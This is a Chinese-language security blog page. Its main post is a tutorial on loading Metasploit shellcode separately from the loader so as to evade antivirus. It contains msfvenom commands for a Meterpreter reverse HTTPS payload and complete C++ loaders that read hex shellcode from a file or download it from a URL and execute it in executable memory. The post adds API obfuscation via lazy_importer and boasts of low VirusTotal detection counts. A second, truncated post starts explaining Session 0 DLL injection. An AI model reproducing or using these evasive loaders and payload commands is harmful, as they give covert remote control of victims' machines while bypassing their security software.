    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文详细介绍了如何通过文件加载和远程URL加载方式实现Shellcode分离加载，以规避安全软件的检测。文章首先描述了通过Metasploit Framework生成的shellcode文件加载的过程，并提供了相关的C++代码。</p>
<p>为了避免被杀毒软件检测，利用动态API调用和lazy_importer项目进行代码优化。其次，文章讨论了如何通过远程URL加载shellcode，也提供了相应的实现代码。整篇文章旨在帮助读者理解shellcode分离加载的具体实现过程和原理，同时通过实践操作增强对这一技术的掌握程度</p>
<h1 id="一、通过文件加载"><a href="#一、通过文件加载" class="headerlink" title="一、通过文件加载"></a>一、通过文件加载</h1><h2 id="msf生成shellcode文件"><a href="#msf生成shellcode文件" class="headerlink" title="msf生成shellcode文件"></a>msf生成shellcode文件</h2><p>使用<code>msfvenom</code>生成raw格式的文本文件, 但是raw格式的文本文件很容易就会被杀软查杀，为了防止通讯特征被检测到，此处我还做了msf流量加密，此处若想了解msf流量加密的朋友可以去看这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xf555er/article/details/128051211?ops_request_misc=&request_id=&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~koosearch~default-1-128051211-null-null.268%5Ev1%5Ekoosearch&utm_term=%E6%B5%81%E9%87%8F&spm=1018.2226.3001.4450">MSF流量加密</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.47.155 lport=4444 PayloadUUIDTracking=true HandlerSSLCert=ssl.pem PayloadUUIDName=henry -f raw -o shellcode_raw.txt</span><br></pre></td></tr></table></figure>

<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230522202357728.png" alt="image-20230522202357728"></p>
<p>为了不被杀软查杀，并将其保存为十六进制格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.47.155 lport=4444 PayloadUUIDTracking=true HandlerSSLCert=ssl.pem PayloadUUIDName=henry -f hex -o shellcode_hex.txt</span><br></pre></td></tr></table></figure>

<img src="shellcode分离加载/image-20230522202559734.png" alt="image-20230522202559734" style="zoom:67%;" />	



<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>这段代码的作用是从一个以十六进制表示的文件中读取shellcode，然后将其加载到内存中，并执行该shellcode</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制中的单个字符转换为相应的整数值</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">hexCharToByte</span><span class="params">(<span class="type">char</span> character)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制字符串转换成字节型数组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hexStringToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hexString, <span class="type">unsigned</span> <span class="type">char</span>* byteArray, <span class="type">int</span> byteArraySize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; hexString.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">        byteArray[i / <span class="number">2</span>] = <span class="built_in">hexCharToByte</span>(hexString[i]) * <span class="number">16</span> + <span class="built_in">hexCharToByte</span>(hexString[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line"></span><br><span class="line">    <span class="function">std::ifstream <span class="title">file</span><span class="params">(<span class="string">&quot;shellcode_hex.txt&quot;</span>)</span></span>;  <span class="comment">//打开指定文件</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> size;  <span class="comment">//定义文件内容的字节数</span></span><br><span class="line">    string contents; <span class="comment">//定义文件内容</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断文件是否打开成功</span></span><br><span class="line">    <span class="keyword">if</span> (file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::stringstream buffer; <span class="comment">//创建一个stringstream对象</span></span><br><span class="line">        buffer &lt;&lt; file.<span class="built_in">rdbuf</span>();  <span class="comment">//将文件的内容复制到该流中</span></span><br><span class="line">        contents = buffer.<span class="built_in">str</span>();  <span class="comment">//将stringstream对象的内容转换string,并将其存储在contents中</span></span><br><span class="line"></span><br><span class="line">        size = contents.<span class="built_in">length</span>()/<span class="number">2</span>;  <span class="comment">//由于两个十六进制相当于一个字节,因此文件内容长度需除以2</span></span><br><span class="line">        file.<span class="built_in">close</span>();  <span class="comment">//关闭文件</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;, size); </span></span><br><span class="line">    <span class="comment">//cout &lt;&lt; contents;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为存储转换后的shellcode分配内存</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用函数将十六进制字符串转换为字节型数组</span></span><br><span class="line">    <span class="built_in">hexStringToBytes</span>(contents, buffer, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在内存中分配一块可以执行的区域</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将shellcode复制到该区域</span></span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buffer, size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行该shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*) ())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><p>火绒和WindowsDefender都报毒了, 其原因是内存申请函数<code>VirtualAlloc</code>被检测到了，那就使用动态调用api来绕过检测</p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230522235637826.png" alt="image-20230522235637826"></p>
<p>导入<code>lazy_importer</code>项目来动态调用系统api, 然后在api函数前面添加上<code>(LI_FN)</code>，并将函数参数的<code>NULL</code>替换成<code>nullptr</code></p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523000215217.png" alt="image-20230523000215217"></p>
<p>​	</p>
<p>修改完代码后360不会报毒了, 上传到virus Total中的进行检测，查杀率为2&#x2F;70，效果还不错</p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523000118697.png" alt="image-20230523000118697">		</p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523000630744.png" alt="image-20230523000630744">		</p>
<h1 id="二、通过远程url加载"><a href="#二、通过远程url加载" class="headerlink" title="二、通过远程url加载"></a>二、通过远程url加载</h1><h2 id="http服务目录放置shellcode文件"><a href="#http服务目录放置shellcode文件" class="headerlink" title="http服务目录放置shellcode文件"></a>http服务目录放置shellcode文件</h2><p>另一种shellcode分离加载的方法是通过远程URL加载。首先，我们需要在HTTP服务目录放置shellcode文件，然后启用HTTP服务：<code>python -m http.server 8000</code></p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523230821603.png" alt="image-20230523230821603"></p>
<img src="shellcode分离加载/image-20230523230937729.png" alt="image-20230523230937729" style="zoom:67%;" />		



<h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><p>基于上述代码的基础上，添加了<code>GetUrl_HexContent</code>函数，其作用是从指定url下载内容并将其存储在给定的缓冲区中，随后加载至内存</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;wininet.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lazy_importer.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制中的单个字符转换为相应的整数值</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">hexCharToByte</span><span class="params">(<span class="type">char</span> character)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制字符串转换成字节型数组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hexStringToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hexString, <span class="type">unsigned</span> <span class="type">char</span>* byteArray, <span class="type">int</span> byteArraySize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; hexString.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">        byteArray[i / <span class="number">2</span>] = <span class="built_in">hexCharToByte</span>(hexString[i]) * <span class="number">16</span> + <span class="built_in">hexCharToByte</span>(hexString[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从指定的URL下载内容并将其存储到给定的缓冲区中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param url 要下载的URL</span></span><br><span class="line"><span class="comment"> * @param buffer 存储下载内容的缓冲区</span></span><br><span class="line"><span class="comment"> * @return 下载的字节数（注意：字节数是原始十六进制字符串长度的一半）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">GetUrl_HexContent</span><span class="params">(LPSTR url, std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;&amp; buffer)</span> </span>&#123;</span><br><span class="line">    HINTERNET hInternet, hConnect;</span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    DWORD bufferSize = <span class="number">0</span>;</span><br><span class="line">    DWORD contentLength = <span class="number">0</span>;</span><br><span class="line">    DWORD index = <span class="number">0</span>;</span><br><span class="line">    DWORD bufferLength = <span class="built_in">sizeof</span>(bufferSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开一个与互联网的连接</span></span><br><span class="line">    hInternet = <span class="built_in">InternetOpen</span>(<span class="string">L&quot;User Agent&quot;</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hInternet == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;InternetOpen failed. Error: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开一个URL连接</span></span><br><span class="line">    hConnect = <span class="built_in">InternetOpenUrlA</span>(hInternet, url, <span class="literal">NULL</span>, <span class="number">0</span>, INTERNET_FLAG_RELOAD, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hConnect == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;InternetOpenUrlA failed. Error: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">InternetCloseHandle</span>(hInternet);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询HTTP响应头中的内容长度</span></span><br><span class="line">    <span class="built_in">HttpQueryInfo</span>(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &amp;contentLength, &amp;bufferLength, &amp;index);</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">char</span>&gt; <span class="title">hexBuffer</span><span class="params">(contentLength + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取URL返回的内容到hexBuffer中</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">InternetReadFile</span>(hConnect, &amp;hexBuffer[<span class="number">0</span>], contentLength, &amp;bytesRead)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;InternetReadFile failed. Error: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (bytesRead &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        hexBuffer[bytesRead] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="comment">// 调整buffer的大小，以便存储转换后的字节数据</span></span><br><span class="line">        buffer.<span class="built_in">resize</span>(bytesRead / <span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 将十六进制字符串转换为字节型数组</span></span><br><span class="line">        <span class="built_in">hexStringToBytes</span>(&amp;hexBuffer[<span class="number">0</span>], &amp;buffer[<span class="number">0</span>], bytesRead / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(hConnect);</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(hInternet);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回读取到的字节数（注意：字节数是原始十六进制字符串长度的一半）</span></span><br><span class="line">    <span class="keyword">return</span> bytesRead / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 把这个URL换成你的shellcode文件的URL</span></span><br><span class="line">    LPSTR url = (<span class="type">char</span>*)<span class="string">&quot;http://127.0.0.1:8000/shellcode_hex.txt&quot;</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//存放恶意代码的数组</span></span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; buffer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取远程url的16进制内容,并将其存放至buffer数组</span></span><br><span class="line">    <span class="type">size_t</span> size = <span class="built_in">GetUrl_HexContent</span>(url, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在内存中分配一块可以执行的区域</span></span><br><span class="line">    <span class="type">char</span>* exec = (<span class="type">char</span>*)<span class="built_in">LI_FN</span>(VirtualAlloc)(<span class="literal">nullptr</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到该区域</span></span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buffer.<span class="built_in">data</span>(), size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行该shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*) ())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印buffer的内容，只为演示，实际使用中可能并不需要这一步</span></span><br><span class="line">    <span class="comment">/*for (size_t i = 0; i &lt; buffer.size(); i++) &#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%02X &quot;, buffer[i]);</span></span><br><span class="line"><span class="comment">        if ((i + 1) % 16 == 0) &#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>VirusTotal检测只有一个报毒</p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523204811063.png" alt="image-20230523204811063">	</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/session0%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/session0%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当我们使用远程线程注入将dll注入至系统服务进程中往往会失败，这是因为大多数系统服务都是在Session0中运行的</p>
<p>“Session 0”是Windows操作系统中的一个特殊的会话，专门用于运行系统服务和其他在用户登录之前就需要运行的程序。从Windows Vista和Windows Server 2008开始，为了提高安全性，Windows将用户和系统服务分隔在不同的会话中。具体来说，所有的服务和系统任务都在Session 0中运行，而所有用户交互任务都在其他会话中运行</p>
<p>“Session 0注入”一般指的是把一个程序（通常是一个恶意程序）注入到Session 0的过程。因为Session 0有许多特权，所以如果恶意程序能够成功注入到Session 0，就可以获得比正常用户更高的权限，从而进行更多的恶意操作</p>
<p>然而，由于Windows Vista和后续版本的Windows的安全性提高，使得Session 0注入变得更加困难。尤其是，Session 0是隔离的，不能直接与用户的图形会话进行交互</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/07be2c8ed1a09d94715df0ee9e2f9fbd225360e3.png@855w_627h_progressive.webp" alt="image">	</p>
<p>​		</p>
<h1 id="远程线程注入函数调用流程"><a href="#远程线程注入函数调用流程" class="headerlink" title="远程线程注入函数调用流程"></a>远程线程注入函数调用流程</h1><h2 id="1-CreateRemoteThreadStub"><a href="#1-CreateRemoteThreadStub" class="headerlink" title="1.CreateRemoteThreadStub"></a>1.CreateRemoteThreadStub</h2><p><code>CreateRemoteThreadStub</code>是在<code>kernel32.dll</code>中，用于对<code>CreateRemoteThread</code>函数的封装，对<code>CreateRemoteThread</code>的参数进行处理，由原来的7个参数扩展到8个参数，并对<code>dwCreationFlags</code>参数进行安全处理</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611165350503.png" alt="image-20230611165350503"></p>
<h2 id="2-CreateRemoteThread"><a href="#2-CreateRemoteThread" class="headerlink" title="2.CreateRemoteThread"></a>2.CreateRemoteThread</h2><p><code>CreateRemoteThread</code>函数位于KernelBase.dll中，最终调用了<code>NtCreateThreadEx</code>函数</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611165720925.png" alt="image-20230611165720925"></p>
